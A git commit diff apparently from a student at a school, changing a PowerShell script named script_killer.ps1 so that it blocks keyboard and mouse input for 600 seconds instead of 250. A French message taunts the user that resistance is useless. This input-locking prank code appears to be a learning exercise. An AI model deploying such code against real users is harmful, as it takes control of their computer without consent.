8fdad537cc6a165678fc2af4ce53d767a4d68af2
unknown <Student@SIOP0202-EDU-06.EPTM.lan>
2025-08-29 16:20:56 +0200

    Changement sur le script powershell 4

--- powershell/script_killer.ps1
+++ powershell/script_killer.ps1
@@ -8,7 +8,7 @@ public class BlockInputHelper {
 }
 "@
 
-$blockDurationSeconds = 250
+$blockDurationSeconds = 600
 
 Write-Host "Toute action est inutile, j'ai l'emprise sur ton clavier et ta souris. pour $blockDurationSeconds seconds" -ForegroundColor Red
 
